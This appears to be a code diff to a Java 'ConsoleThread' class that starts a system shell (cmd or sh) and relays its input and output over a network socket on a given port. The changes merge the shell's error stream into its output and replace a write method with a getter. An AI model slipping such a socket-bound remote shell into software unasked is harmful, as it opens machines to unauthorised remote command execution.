@@ -24,10 +24,10 @@ public class ConsoleThread extends Thread {
     private PrintWriter out;
     private Process proccess;
     private BufferedReader proccessReader;
-    private BufferedReader proccessErrorReader;
+    //private BufferedReader proccessErrorReader;
     private PrintWriter proccessWriter;
     private ProcessThread proccessThread;
-    private ProcessThread proccessErrorThread;
+    //private ProcessThread proccessErrorThread;
 
     public ConsoleThread(Integer port) throws IOException {
         super("Console Thread");
@@ -38,23 +38,27 @@ public class ConsoleThread extends Thread {
         out = new PrintWriter(socket.getOutputStream(), true);
 
         if (isWindows()) {
-            proccess = Runtime.getRuntime().exec("cmd");
+        	ProcessBuilder pb = new ProcessBuilder("cmd");
+            pb.redirectErrorStream(true);
+            proccess = pb.start();
         } else {
-            proccess = Runtime.getRuntime().exec("sh");
+        	ProcessBuilder pb = new ProcessBuilder("sh");
+            pb.redirectErrorStream(true);
+            proccess = pb.start();
         }
 
         proccessReader = new BufferedReader(new InputStreamReader(proccess.getInputStream()));
-        proccessErrorReader = new BufferedReader(new InputStreamReader(proccess.getErrorStream()));
+        //proccessErrorReader = new BufferedReader(new InputStreamReader(proccess.getErrorStream()));
         proccessWriter = new PrintWriter(proccess.getOutputStream(), true);
 
         proccessThread = new ProcessThread(this, proccessReader);
-        proccessErrorThread = new ProcessThread(this, proccessErrorReader);
+        //proccessErrorThread = new ProcessThread(this, proccessErrorReader);
     }
 
     @Override
     public void run() {
         proccessThread.start();
-        proccessErrorThread.start();
+        //proccessErrorThread.start();
 
         try {
             String buffer;
@@ -79,11 +83,11 @@ public class ConsoleThread extends Thread {
             Logger.getLogger(ProcessThread.class.getName()).log(Level.SEVERE, null, ex);
         }
     }
-
-    public void write(String str) {
-        out.println(str);
-    }
     
+    public PrintWriter getOut() {
+    	return out;
+    }
+
     public static boolean isWindows() {
         String os = System.getProperty("os.name").toLowerCase();
 
